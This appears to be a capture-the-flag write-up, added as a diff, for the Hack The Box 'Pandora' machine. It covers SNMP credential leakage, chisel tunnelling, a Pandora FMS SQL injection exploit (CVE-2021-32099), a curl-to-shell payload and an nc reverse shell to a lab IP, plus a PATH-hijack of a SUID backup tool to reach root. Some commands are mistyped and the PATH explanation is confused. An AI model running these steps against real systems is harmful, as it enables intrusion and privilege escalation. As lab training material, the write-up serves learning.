@@ -1,0 +1,71 @@
+ip 	: 10.10.11.136
+OS 	: Ubuntu
+Vuln	: Pandora FMS Unauthenticated SqlInjection (CVE-2021-32099) (https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained)
+
+# Recon
+scan entire port in tcp/udp mode with nmap. The result, there is udp port 161 that running snmp v1 and v3 analyaze the output, there is ssh user & pass for our initial access
+
+# Foothold
+in snmp there is running program that running 'host_check' program with user daniel and password HotelBabylon23. login to ssh with these credential.
+
+# PE I
+like always see what can we ran as sudo 'sudo -l' , runnning process as root 'ps -aux | grep root' and notice something !, or search for SUID.
+
+in running process, root has ran program 'host_check':
+root root xxx xxxx sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'
+
+notice the '/usr/bin/host_check', try to run as user daniel and pay attention to the output, the output is stored at daniel home directory as '.host_check' see the content and notice there will be another domain that only accessible with localhost and pandora version on it. Soo portforwarding with chisel or ssh (i use chisel) 
+local machine :
+~# chisel server -p 8000 --reverse
+
+target machine:
+~$ chisel client <local ip>:8000 R:80:127.0.0.1:80
+
+see for more :
+https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html
+
+now we are in 1 connection. because we know the version searech for related exploit in github, i got https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated
+
+clone the script and run it in our local machine with given information:
+~# python3 sqlpwn.py -t localhost
+
+booom we got another shell as matt. 
+Revershell ? 
+
+change the php payload in data variable line 88 to:
+curl http://<local ip>/rev.sh | sh
+
+host rev.sh in your local machine.
+
+rev.sh
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.76 1717 >/tmp/f
+
+# ROOT
+now have shell as matt, as always i started with find SUID, what can i run with sudo, what ports are listen ?
+when searching for SUID (find / -perm -4000 2>/dev/null)
+i got "pandora_backup" which i do not know what it is. i ran it and it backing up the entire pandora directory at /var/www/pandora/pandora_console
+
+soo it's better to analyze it with 'strings' but the target machine has no 'strings', so lets download it with nc.
+local machine :
+~# nc -nvlp 9001 > pandora_backup
+
+target :
+~$ cat /usr/bin/pandora_backup | cat <local ip> 9001
+
+once finish, strings it to see what inside it.
+PandoraFMS Backup Utility                                                    Now attempting to backup PandoraFMS client                                   tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*
+
+hmm the program run 'tar' to backup pandora.
+lets poisoning the PATH variable since the PATH check the FIFO (first in first out) the first PATH content will be checked and if there is 'tar' program then the OS will be exec that.
+
+~$ cd /tmp
+~$ echo '/bin/bash' > tar
+~$ chmod +x tar
+~$ export PATH=/tmp:$PATH
+
+~$ pandora_backup
+and.....
+root@pandora:/tmp# id
+uid=0(root) gid=1000(matt) groups=1000(matt)
+
+yesss rooted !
